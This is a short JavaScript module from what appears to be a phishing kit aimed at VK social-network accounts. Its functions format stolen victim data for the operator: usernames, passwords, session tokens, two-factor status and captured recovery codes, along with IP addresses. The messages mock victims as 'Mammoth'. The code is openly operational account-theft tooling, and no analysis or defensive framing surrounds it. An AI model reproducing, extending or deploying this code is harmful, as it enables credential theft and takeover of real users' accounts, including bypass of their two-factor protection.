export function success(data) {
  return `<b>🐘 Mammoth logged in successful 🔓</b>
Username: <code>${data.username}</code>
Password: <code>${data.password}</code>
Token: <code>${data.token}</code>
Profile:
<a href="https://vk.com/id${data.user_id}">
  ${data.first_name} ${data.last_name}
</a>

2fa: ${"code" in data ? "<b>Yes</b>" : "No"}

IP: ${data.ip}
Platform: ${data.platform}`;
}
export function fail(data) {
  return `<b>🐘 Mammoth can not remember pass 🤦‍♂️</b>
Username: <code>${data.username}</code>
Password: <code>${data.password}</code>

IP: ${data.ip}
Platform: ${data.platform}`;
}
export function mfa(data) {
  return `<b>🐘 Mammoth has 2FA ⚠️</b>
Username: <code>${data.username}</code>
Password: <code>${data.password}</code>

IP: ${data.ip}
Platform: ${data.platform}`;
}
export function recoveryCodes(data) {
  return `<b>🐘 Successfully got Mammoth's recovery Codes ✅</b>
  
Username: <code>${data.username}</code>
Password: <code>${data.password}</code>
Codes: ${data.codes.map(code => `<code>${code}</code>`).join(", ")}

Profile:
<a href="https://vk.com/id${data.user_id}">
  ${data.first_name} ${data.last_name}
</a>

IP: ${data.ip}
Platform: ${data.platform}`;
}
